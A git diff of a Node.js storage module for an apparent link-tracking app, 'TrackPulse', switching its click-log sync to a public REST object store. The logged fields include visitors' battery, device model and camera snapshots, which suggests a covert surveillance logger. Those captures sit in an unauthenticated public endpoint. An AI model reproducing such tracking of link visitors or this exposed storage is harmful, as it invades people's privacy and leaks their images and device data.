@@ -2,7 +2,11 @@ const fs = require('fs');
 const path = require('path');
 const axios = require('axios');
 
-// Support Vercel / Serverless read-only filesystem
+// Permanent Cloud Database Object ID on RESTful Cloud Database
+const CLOUD_OBJECT_ID = process.env.CLOUD_OBJECT_ID || 'ff808181a09d98f701a0c38a699b5fa4';
+const CLOUD_DB_URL = `https://api.restful-api.dev/objects/${CLOUD_OBJECT_ID}`;
+
+// Local file fallback
 let localDbPath = path.join(__dirname, 'data.json');
 try {
   fs.accessSync(__dirname, fs.constants.W_OK);
@@ -18,32 +22,34 @@ const defaultData = {
   nextLogId: 1
 };
 
-// Global in-memory cache
+// In-memory cache
 let memoryCache = null;
 
-// Free Permanent Cloud DB Endpoint for Vercel Serverless Sync
-const CLOUD_BIN_URL = process.env.CLOUD_BIN_URL || 'https://api.npoint.io/0839e248b64e56598db4';
-
-// Fast sync from cloud
+// Fetch data from Cloud Database
 async function fetchCloudData() {
   try {
-    const res = await axios.get(CLOUD_BIN_URL, { timeout: 2000 });
-    if (res.data && Array.isArray(res.data.links)) {
-      memoryCache = res.data;
-      saveLocalData(res.data);
-      return res.data;
+    const res = await axios.get(CLOUD_DB_URL, { timeout: 3000 });
+    if (res.data && res.data.data && Array.isArray(res.data.data.links)) {
+      memoryCache = res.data.data;
+      saveLocalData(res.data.data);
+      return res.data.data;
     }
   } catch (err) {}
   return loadLocalData();
 }
 
-// Push to Cloud DB asynchronously
-function saveCloudData(data) {
+// Push data to Cloud Database
+async function saveCloudData(data) {
   memoryCache = data;
   saveLocalData(data);
   try {
-    axios.post(CLOUD_BIN_URL, data, { timeout: 3000 }).catch(() => {});
-  } catch (err) {}
+    await axios.put(CLOUD_DB_URL, {
+      name: 'TrackPulse Database',
+      data: data
+    }, { timeout: 3500 });
+  } catch (err) {
+    console.error('Cloud DB sync error:', err.message);
+  }
 }
 
 function loadLocalData() {
@@ -82,7 +88,7 @@ module.exports = {
       created_at: new Date().toISOString()
     };
     data.links.push(newLink);
-    saveCloudData(data);
+    await saveCloudData(data);
     return newLink;
   },
 
@@ -113,7 +119,7 @@ module.exports = {
     const strId = String(id);
     data.links = data.links.filter(l => String(l.id) !== strId);
     data.click_logs = data.click_logs.filter(c => String(c.link_id) !== strId);
-    saveCloudData(data);
+    await saveCloudData(data);
     return true;
   },
 
@@ -153,7 +159,7 @@ module.exports = {
       created_at: new Date().toISOString()
     };
     data.click_logs.push(newLog);
-    saveCloudData(data);
+    await saveCloudData(data);
     return newLog;
   },
 
@@ -172,7 +178,7 @@ module.exports = {
       if (clientData.battery) log.battery = clientData.battery;
       if (clientData.deviceModel && clientData.deviceModel !== 'N/A') log.device_model = clientData.deviceModel;
       if (clientData.cameraSnap) log.camera_snap = clientData.cameraSnap;
-      saveCloudData(data);
+      await saveCloudData(data);
     }
   },
 
